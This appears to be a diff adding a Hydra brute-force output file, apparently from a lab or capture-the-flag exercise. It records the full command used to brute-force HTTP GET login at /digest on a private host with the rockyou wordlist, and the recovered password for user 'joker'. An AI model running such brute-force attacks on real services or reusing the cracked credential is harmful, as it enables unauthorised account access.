@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-02-12 18:09:30 on 10.10.223.63 http-get (hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 -o joker_pass.txt 10.10.223.63 http-get /digest)
+[8080][http-get] host: 10.10.223.63   login: joker   password: hannah
